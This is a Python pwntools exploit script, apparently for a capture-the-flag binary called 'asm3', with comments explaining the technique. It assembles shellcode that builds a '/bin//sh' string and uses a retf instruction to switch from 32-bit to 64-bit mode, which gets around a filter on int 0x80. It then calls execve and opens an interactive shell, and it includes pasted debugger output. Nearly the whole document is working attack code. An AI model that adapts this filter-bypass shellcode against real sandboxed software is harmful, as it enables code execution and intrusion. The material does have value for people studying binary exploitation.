#This asm3 is upgrade version before Christmas2016 asm2
#asm2 binary not xor esp,esp, But asm3 binary exist xor esp,esp

from pwn import *

context.log_level='debug'

s=process('./asm3')

#The address of the __kernel_vsyscall function is written gs: [0x10] is NULL 
#Because => mov gs:[0x10],eax
#But gs:[0] is written data section address!!

shellcode=asm('mov cl,0xcb') #opcode '\xcb' -> reft instruction 
shellcode+=asm('mov esp, gs:[ebx]') #esp <= data section. 
shellcode+=asm('push eax')
shellcode+=asm('push 0x68732f2f')
shellcode+=asm('push 0x6e69622f')
shellcode+=asm('mov edi,esp')

# 32bit $cs reg is 0x23, 64bit $cs reg is 0x33
# 32bit syscall(int 0x80=>'0xcd80') was filtered 
# Therefore by changing $cs register to 0x33, it will enter 64bit mode

#Approximately 'retf' instruction == POP $cs instruction!! and Return 
'''
EDI: 0xf7d2b6f4 ("/bin//sh")
EBP: 0x0 
ESP: 0xf7d2b6ec --> 0xed999031 (syscall)
EIP: 0xed999017 (retf)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
=> 0xed999017:	retf   
   0xed999018:	mov    esp,DWORD PTR gs:[ebx]
   0xed99901b:	push   eax
   0xed99901c:	push   0x68732f2f
[------------------------------------stack-------------------------------------]
0000| 0xf7d2b6ec --> 0xed999031 (syscall)
0004| 0xf7d2b6f0 --> 0x33 ('3')
'''

#POP EIP and POP ps -> JMP EIP 
shellcode+=asm('push 0x33') #to $cs reg will be 0x33, Because of the 'retf' instruction 

shellcode+=asm('mov al,0x3b') #64bit exec_syscall-> $rax=0x3b

#Now retf!! call `before instructe 'mov dl,0xcb' address` for 0xcb
#for example.1)
#0x00440030      \xE8\x00\x00\x00\x00       call Next_instruction(call 0x00440035)

#for example.2)
#0x00440030      \xE8\xff\xff\xff\xff       call Next_instruction-1(call 0x00440034)   

shellcode+='\xe8\xe6\xff\xff\xff'
shellcode+='\x0f\x05' #64bit syscall

print "Shellcode Length: "+str(len(shellcode))

s.recvuntil('give me your shellcode:')
s.send(shellcode+'\x90'*(30-len(shellcode)))

s.interactive()
